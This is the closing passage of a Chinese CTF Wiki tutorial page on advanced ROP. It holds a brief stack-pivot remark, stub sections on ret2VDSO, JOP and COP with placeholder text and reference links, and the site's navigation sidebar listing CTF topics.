<span class="n">mov</span> <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</pre></div>
</div>
<p>此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。</p>
</div>
<div class="section" id="id13">
<h3>原理<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h3>
<p>待补充。</p>
</div>
<div class="section" id="id14">
<h3>题目<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><strong>Defcon 2015 Qualifier fuckup</strong></li>
</ul>
<p>参考</p>
<ul class="simple">
<li><a class="reference external" href="http://man7.org/linux/man-pages/man7/vdso.7.html">http://man7.org/linux/man-pages/man7/vdso.7.html</a></li>
<li><a class="reference external" href="http://adam8157.info/blog/2011/10/linux-vdso/">http://adam8157.info/blog/2011/10/linux-vdso/</a></li>
</ul>
</div>
</div>
<div class="section" id="jop">
<h2>JOP<a class="headerlink" href="#jop" title="永久链接至标题">¶</a></h2>
<p>Jump-oriented programming</p>
</div>
<div class="section" id="cop">
<h2>COP<a class="headerlink" href="#cop" title="永久链接至标题">¶</a></h2>
<p>Call-oriented programming</p>
</div>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
<div id="searchbox" style="display: none" role="search">
  <h3>快速搜索</h3>
    <form class="search" action="../../search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="转向" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
<div class="sphinx-toc sphinxglobaltoc">
<h3><a href="../../index.html">內容目录</a></h3>
<p class="caption"><span class="caption-text">CTF 介绍</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/history.html">CTF 竞赛的历史</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/mode.html">CTF 竞赛模式简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/content.html">CTF 竞赛内容</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/experience.html">线下攻防经验小结</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/cgc.html">CGC 网络超级挑战赛</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../introduction/resources.html">学习资源</a></li>
</ul>
<p class="caption"><span class="caption-text">Misc</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/about.html">杂项简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/recon.html">信息搜集技术</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/encode/index.html">编码分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/prefix.html">取证隐写</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/picture/index.html">图片分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/traffic/index.html">流量包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/archive/index.html">压缩包分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/audio/index.html">音频分析</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/disk_memory/index.html">磁盘 / 内存分析</a></li>
</ul>
<p class="caption"><span class="caption-text">Crypto</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/introduction.html">密码学简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/classical/index.html">古典密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/symmetric/index.html">对称加密</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/asymmetric/index.html">非对称密码</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/hash/index.html">哈希函数</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/signature/index.html">数字签名</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../crypto/others/others.html">证书格式</a></li>
</ul>
<p class="caption"><span class="caption-text">Web</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../web/index.html">WEB 简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/sqli.html">SQL 注入</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/xss.html">XSS 跨站脚本攻击</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/csrf.html">CSRF 跨站请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/ssrf.html">SSRF 服务端请求伪造</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../web/php.html">PHP 代码审计</a></li>
</ul>
<p class="caption"><span class="caption-text">Reverse</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/introduction.html">软件逆向工程简介</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unpack/index.html">Unpack Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/unicorn/index.html">Unicorn Engine</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/anti_debug/index.html">Anti Debug Tech</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../reverse/linux/index.html">Linux RE</a></li>
</ul>
<p class="caption"><span class="caption-text">Pwn</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="reference internal" href="index.html">栈溢出</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="stack_intro.html">栈介绍</a></li>
<li class="toctree-l2"><a class="reference internal" href="stackoverflow_basic.html">栈溢出原理</a></li>
<li class="toctree-l2"><a class="reference internal" href="basic_rop.html">基本ROP</a></li>
<li class="toctree-l2"><a class="reference internal" href="others.html">花式栈溢出技巧</a></li>
<li class="toctree-l2"><a class="reference internal" href="medium_rop.html">中级ROP</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">高级ROP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#ret2-dl-runtime-resolve">ret2_dl_runtime_resolve</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id1">原理</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id2">攻击条件</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id3">示例</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#id4">正常攻击</a><ul>
<li class="toctree-l6"><a class="reference internal" href="#stage-1">stage 1</a></li>
<li class="toctree-l6"><a class="reference internal" href="#stage-2">stage 2</a></li>
<li class="toctree-l6"><a class="reference internal" href="#stage-3">stage 3</a></li>
<li class="toctree-l6"><a class="reference internal" href="#stage-4">stage 4</a></li>
<li class="toctree-l6"><a class="reference internal" href="#stage-5">stage 5</a></li>
<li class="toctree-l6"><a class="reference internal" href="#stage-6">stage 6</a></li>
</ul>
</li>
<li class="toctree-l5"><a class="reference internal" href="#id5">工具攻击</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#id6">题目</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#srop">SROP</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id7">基本介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#signal">signal机制</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id8">攻击原理</a><ul>
<li class="toctree-l5"><a class="reference internal" href="#shell">获取shell</a></li>
<li class="toctree-l5"><a class="reference internal" href="#system-call-chains">system call chains</a></li>
<li class="toctree-l5"><a class="reference internal" href="#id9">后续</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="#id10">利用工具</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id11">示例</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id12">题目</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#ret2vdso">ret2VDSO</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#vdso">VDSO介绍</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id13">原理</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id14">题目</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#jop">JOP</a></li>
<li class="toctree-l3"><a class="reference internal" href="#cop">COP</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../fmtstr/index.html">格式化字符串漏洞</a></li>
<li class="toctree-l1"><a class="reference internal" href="../heap/index.html">堆利用</a></li>
</ul>
<p class="caption"><span class="caption-text">Executable</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../executable/elf/index.html">ELF文件</a></li>
</ul>
</div>
        </div>
      </div>
    
    
        <div class="sidebar-toggle-group no-js">
            
            <button class="sidebar-toggle" id="sidebar-hide" title="Hide the sidebar menu">
                 «
                <span class="show-for-small">hide menu</span>
                
            </button>
            <button class="sidebar-toggle" id="sidebar-show" title="Show the sidebar menu">
                
                <span class="show-for-small">menu</span>
                <span class="hide-for-small">sidebar</span>
                 »
            </button>
        </div>
    
      <div class="clearer"></div>
    </div>
    <div class="relbar-bottom">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             >toc</a></li>
        <li class="right" >
          <a href="../fmtstr/index.html" title="格式化字符串漏洞"
             >下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="medium_rop.html" title="中级ROP"
             >上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" >栈溢出</a> &#187;</li> 
      </ul>
    </div>
    </div>

    <div class="footer" role="contentinfo">
        &#169; Copyright 2016-2017, CTF Wiki.
      由 <a href="http://sphinx-doc.org/">Sphinx</a> 1.6.7 创建。
    </div>
    <!-- cloud_sptheme 1.4 -->
  </body>
</html>